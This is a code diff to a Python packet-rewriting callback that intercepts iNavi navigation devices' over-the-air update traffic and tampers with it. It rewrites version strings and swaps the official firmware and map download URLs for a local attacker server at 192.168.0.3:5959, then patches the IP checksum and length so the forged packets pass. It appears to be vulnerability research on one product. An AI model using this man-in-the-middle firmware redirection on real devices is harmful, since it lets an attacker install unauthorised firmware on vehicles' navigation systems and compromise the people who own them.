@@ -66,11 +66,17 @@ def cb(pkt):
         if "OTA" in str(pkt):
             #pkt.show2()
             befLen = len(pkt)
-            new_pkt = chg_str(new_pkt, "Version=\'UFI22\'", "Version=\'UFI33\'")
-            new_pkt = chg_str(new_pkt, "http://liveupdate3.inavi.com/inaviX1DASH/util/os/full_runa-ota-RNA.UFI22-signed.zip", "http://192.168.0.3:5959/popjy.zip")
-            #new_pkt = chg_str(new_pkt, "http://liveupdate3.inavi.com/inaviX1DASH/util/os/full_runa-ota-RNA.UFI22-signed.zip", "http://ftp.kaist.ac.kr/doxygen/Doxygen-1.8.9.dmg")
+            #new_pkt = chg_str(new_pkt, "InaviInfo Version=\'3.0.B12941\'", "InaviInfo Version=\'3.0.B12942\'")
+            #new_pkt = chg_str(new_pkt, "Build=\'12941\'", "Build=\'12942\'")
+            #new_pkt = chg_str(new_pkt, "DownloadUrl=\'http://dn.cdn3.inavi.com/_idns_data/1705/_Inavi/inavi3d_all_B12941.zip\'", "DownloadUrl=\'192.168.0.3:5959/inavi3d_all_B12942.zip\'")
+            
+            ##################change network firmware update#################################
+            #new_pkt = chg_str(new_pkt, "Version=\'UFI22\'", "Version=\'UFI33\'")
+            #new_pkt = chg_str(new_pkt, "http://liveupdate3.inavi.com/inaviX1DASH/util/os/full_runa-ota-RNA.UFI22-signed.zip", "http://192.168.0.3:5959/full_runa-ota-RNA.UFI33-signed.zip")
+            ################################################################################
+
             #new_pkt = chg_str(new_pkt, "http://liveupdate3.inavi.com/inaviX1DASH/util/os/full_runa-ota-RNA.UFI22-signed.zip", "http://dn.cdn3.inavi.com/_idns_data/1705/_Inavi/inavi3d_all_B12941.zip")
-            new_pkt = chg_str(new_pkt, "UpdateMessage=\'.\'", "UpdateMessage=\'PizzaSch001\'")
+            #new_pkt = chg_str(new_pkt, "UpdateMessage=\'.\'", "UpdateMessage=\'PizzaSch001\'")
             #new_pkt = chg_str(new_pkt, "FileSize=\'167697268\'", "FileSize=\'167670340\'")
             del new_pkt[IP].chksum
             new_pkt[IP].len += len(new_pkt) - befLen
